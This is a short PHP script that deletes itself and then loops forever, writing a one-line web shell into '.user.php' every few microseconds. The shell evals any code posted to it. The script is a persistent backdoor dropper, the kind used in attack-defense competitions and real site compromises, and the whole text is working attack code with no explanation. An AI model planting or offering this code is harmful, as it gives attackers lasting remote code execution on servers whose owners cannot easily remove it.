<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.user.php';
$shell = '<?php @eval($_POST[Test@1234]);?>';

while (TRUE) {
file_put_contents($file, $shell);
usleep(30);
}
?>